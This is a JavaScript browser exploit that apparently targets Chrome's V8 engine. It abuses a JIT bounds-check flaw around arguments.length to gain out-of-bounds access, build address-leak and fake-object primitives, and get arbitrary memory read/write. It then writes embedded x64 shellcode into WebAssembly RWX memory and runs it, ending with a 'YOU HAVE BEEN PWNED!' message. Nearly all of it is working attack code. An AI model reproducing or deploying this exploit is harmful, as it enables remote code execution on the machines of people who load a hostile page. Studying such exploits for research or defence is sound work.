


/////// MAKE A RWX MEMORY FROM WASM 
var str = "0061 736d 0100 0000 0109 0260 0000 6001 7f01 7f02 4d05 0365 6e76 0366 6666 0000 0365 6e76 066d 656d 6f72 7902 010a 8002 0365 6e76 0574 6162 6c65 0170 0100 0003 656e 760a 6d65 6d6f 7279 4261 7365 037f 0003 656e 7609 7461 626c 6542 6173 6503 7f00 0302 0101 070a 0106 7371 7561 7265 0001 0a28 0126 0041 8080 a001 41f8 acd1 9101 3602 0010 0041 8080 a001 41f8 acd1 9101 3602 0020 0020 006c 0f0b "

var arr = str.split(" ");
var ut8 = new Uint8Array(156);
var j = 0;
for(var i = 0;i < arr.length;i++){
	ut8[j++] = (parseInt(arr[i][0],16) << 4) + parseInt(arr[i][1],16);
	ut8[j++] = (parseInt(arr[i][2],16) << 4) + parseInt(arr[i][3],16);
}

zz = {};
flag = 0;
zz.toString = function(){
  //	Array.prototype.slice.call([]);
 	//while(Date.now()-start < 10000){	}
 	//[].concat();
  	return 0x0;
}
function zzz(){
	//imports.env.memory.grow(100);
	evil_ut[1] = 0x12345678;
}
imports = {};
imports.env = imports.env || {}
Object.assign(imports.env, {
    memoryBase: 0x80000,
    tableBase: 0,
    memory: new WebAssembly.Memory({ initial: 256,maximum:256}),
        //memory: memory1,
    table: new WebAssembly.Table({ initial: 0, maximum: 0, element: 'anyfunc' }),
    fff:zzz,
})

module = new WebAssembly.Module(ut8);

instance1 = new WebAssembly.Instance(module,imports);

var evil_ut = new Uint32Array(imports.env.memory.buffer);

for(let i = 0;i <0x10000;i++){
	instance1.exports.square(2);
}





////////////////// LET US BEGIN TO TRIGER THE PWN!!!!!!!!!

/***********

The arguments.length's range is between [0, 1<<16-2] in compiler. 0x10000
But in fact, we can make it bigger than |1<<16-2|, this will lead to 
kill bound check instr in JIT function.

With this OOB Read/Write, we can make type confusion between object array and double array.

And it is very easy to get RCE under chrome renderer context.

**************/



print = function(){};

var shellcode = [0xe7894955,0xe48348fc,0x00c0e8f0,0x51410000,0x51525041,0xd2314856,0x528b4865,0x528b4860,0x528b4818,0x728b4820,0xb70f4850,0x314d4a4a,0xc03148c9,0x7c613cac,0x41202c02,0x410dc9c1,0xede2c101,0x48514152,0x8b20528b,0x01483c42,0x88808bd0,0x48000000,0x6774c085,0x50d00148,0x4418488b,0x4920408b,0x56e3d001,0x41c9ff48,0x4888348b,0x314dd601,0xc03148c9,0xc9c141ac,0xc101410d,0xf175e038,0x244c034c,0xd1394508,0x4458d875,0x4924408b,0x4166d001,0x44480c8b,0x491c408b,0x8b41d001,0x01488804,0x415841d0,0x5a595e58,0x59415841,0x83485a41,0x524120ec,0x4158e0ff,0x8b485a59,0xff57e912,0x485dffff,0x000001ba,0x00000000,0x8d8d4800,0x00000101,0x8b31ba41,0xd5ff876f,0xa2b5f0bb,0xa6ba4156,0xff9dbd95,0xc48348d5,0x7c063c28,0xe0fb800a,0x47bb0575,0x6a6f7213,0x894c9000,0x63c35dfc,0x00636c61];

function breakpoint(){
	[].concat();
}

let ab = new ArrayBuffer(0x20);
//breakpoint();

let ARRAY_SIZE = 0x10;
let LENGTH_OFFSET = ARRAY_SIZE + 0x5;
let BUFFER_INDEX_ONE = LENGTH_OFFSET + 0x1;
let CODE_OFFSET = 0x40;
//breakpoint();
function jit(arg){
	Array.prototype.fill();
	let x = arguments.length;
	//before = new Array(0x100);
	//before[0] = Array;
	evil = new Array(0x10);
	evil[0] = 1.1;
	bigarray = new Array(0x10);
	bigarray[0] = 1.1;
	victim = new Array(0x10);
	victim[0] = Array;
	x >>= 16;
	x *= 0x15;
	evil[x] = 1.39064994160909e-309;  //0xffff00000000;  overwrite the length of bigarray
}

arr = [1.1,2.2];
arr.length = 0x11000;
arr.fill(3.3);

let marr = [1.1];

flag = 0;
for(let i = 0;i < 100000;i++){
	jit(...marr);
}

//%DebugPrint(evil);
res = jit(...arr);
bigarray.length = 0xffff;
//%DebugPrint(bigarray);
//breakpoint();
function d2u(num){
	let ut = new Uint32Array(2);
	ut[0] = num & 0xffffffff;
	ut[1] = num / 0x100000000;
	let fl = new Float64Array(ut.buffer);
	return fl[0];
}

function d2uArg2(high, low){
	let ut = new Uint32Array(2);
	ut[0] = low;
	ut[1] = high;
	let fl = new Float64Array(ut.buffer);
	return fl[0];
}

function u2d(num){
	let fl = new Float64Array(1);
	fl[0] = num;
	let ut = new Uint32Array(fl.buffer);
	return ut[1] * 0x100000000 + ut[0];
}

function read_obj(obj){
	victim[0] = obj;
	return u2d(bigarray[BUFFER_INDEX_ONE]);
}

function fake_obj(address){
	bigarray[BUFFER_INDEX_ONE] = d2u(address);
	return victim[0];
}

function change_to_float(intarr, floatarr){
	var j = 0;
	for(var i = 0;i < intarr.length; i+=2){
		var fl = d2uArg2(intarr[i+1], intarr[i]);
		floatarr[j] = fl;
		j++;
	}
}

let nop = 0xdeadbee0;
let ab_map_obj = [
	nop,nop,
	0x13080808,0x19000423,0x082003ff,0x0,
	nop,nop, 		//__proto__
	nop,nop,		//ArrayBuffer
	0x0,0x0
];

let ab_proto_addr = read_obj(ab.__proto__);
print("ab_proto_addr:" + ab_proto_addr.toString(16));
let ab_constructor = read_obj(ArrayBuffer);
ab_map_obj[0x6] = ab_proto_addr & 0xffffffff;
ab_map_obj[0x7] = ab_proto_addr / 0x100000000;
ab_map_obj[0x8] = ab_constructor & 0xffffffff;
ab_map_obj[0x9] = ab_constructor / 0x100000000;

let ab_map_obj_float = [1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1];
change_to_float(ab_map_obj, ab_map_obj_float);
//%DebugPrint(ab_map_obj_float);
//%DebugPrint(ab);
//breakpoint();
let ab_map_obj_float_addr = read_obj(ab_map_obj_float) - ab_map_obj_float.length * 0x8;



let fake_ab = [
	ab_map_obj_float_addr & 0xffffffff, ab_map_obj_float_addr / 0x100000000,
	ab_map_obj_float_addr & 0xffffffff, ab_map_obj_float_addr / 0x100000000,
	ab_map_obj_float_addr & 0xffffffff, ab_map_obj_float_addr / 0x100000000,
	0x0, 0x4000, // buffer length
	0x12345678, 0x123, //buffer address
	0x2, 0x0 // or 0x4?
]

let fake_ab_float = [1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1];
change_to_float(fake_ab, fake_ab_float);

let fake_ab_float_addr = read_obj(fake_ab_float) - fake_ab_float.length * 0x8;
print("fake_ab_float_addr: " + fake_ab_float_addr.toString(16));

let fake_arraybuffer = fake_obj(fake_ab_float_addr);
let fake_dv = new DataView(fake_arraybuffer, 0, 0x40);

print(fake_arraybuffer instanceof ArrayBuffer);


let func_body = "eval('');".repeat(0x100);
let function_to_shellcode = new Function("a", func_body);
let code_addr_ref = read_obj(function_to_shellcode) + 0x30 - 1;

print("code_addr_ref addr: " + code_addr_ref.toString(16));



//****************************** AND NOW, WE GET ARB MEMORY R/W************************/

function Read32(addr){
	fake_ab_float[4] = d2u(addr);
	return fake_dv.getUint32(0, true);
}

function Write32(addr, value){
	fake_ab_float[4] = d2u(addr);
	fake_dv.setUint32(0, value, true);
}

function Read64(addr){
	return Read32(addr + 4) * 0x100000000 + Read32(addr);
}

function Write64(addr, value){
	Write32(addr, value & 0xffffffff);
	Write32(addr + 0x4, value / 0x100000000);
}

//let shellcode_address = Read32(code_addr_ref) + Read32(code_addr_ref + 0x4) * 0x100000000 + 0x40 - 0x1;
//print("shellcode_address addr: " + shellcode_address.toString(16));

let module_addr = read_obj(module);
print("module_addr :" + module_addr.toString(16));

// find the RWX memory code from MAGIC
let tmp = Read64(module_addr + 0x18 - 1);
tmp = Read64(tmp + 0x8 - 1);
tmp = Read64(tmp + 0x18);
tmp = Read64(tmp);
tmp = Read64(tmp + 0x50);

RWXAddr = Read64(tmp);
RWXAddr = Math.round(RWXAddr / 0x1000) * 0x1000;


//[].concat();


for(let i = 0;i < shellcode.length; i++){
	Write32(RWXAddr + i * 4 + CODE_OFFSET, shellcode[i]);
}

Write64(code_addr_ref, RWXAddr + 1);
//alert("go to shellcode, plz!");
//alert("RWXAddr :" + (RWXAddr + CODE_OFFSET).toString(16));
function_to_shellcode();

//clean some stuff
function_to_shellcode = null;
fake_dv = null;
fake_arraybuffer = null;
bigarray.length = 0;
victim.length = 0;

document.write("YOU HAVE BEEN PWNED!");

